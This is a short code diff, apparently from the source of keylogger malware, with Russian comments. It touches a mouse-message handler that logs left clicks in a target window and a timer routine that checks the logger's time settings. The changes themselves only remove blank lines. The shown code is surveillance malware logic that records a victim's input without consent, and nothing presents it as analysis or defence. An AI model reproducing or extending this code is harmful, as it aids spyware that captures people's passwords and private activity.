@@ -732,13 +732,11 @@ void ProcessMouseMessage(PMSG Msg)
 {
 	// Обрабатываем сообщения мыши
 
-
 	if ((Msg->wParam & MK_LBUTTON) == 0)
 		return;
 
 	PKeyLogger Logger = GetLogger(true);
 	if (Logger == NULL) return;
-
 
 	// Проверяем необходимость записи кликов
 	if (Msg->hwnd == Logger->ActiveWND && KLG.Filter)
@@ -1908,7 +1906,6 @@ void KeyLogger::OnTimer()
 
 	DWORD Ticks    = (DWORD)pGetTickCount();
 	DWORD WorkTime = TicksToKLGTime(Ticks - KLG.StartTime);
-
 	// проверяем настройки времени
 	switch (KLG.System->TimeMode)
 	{
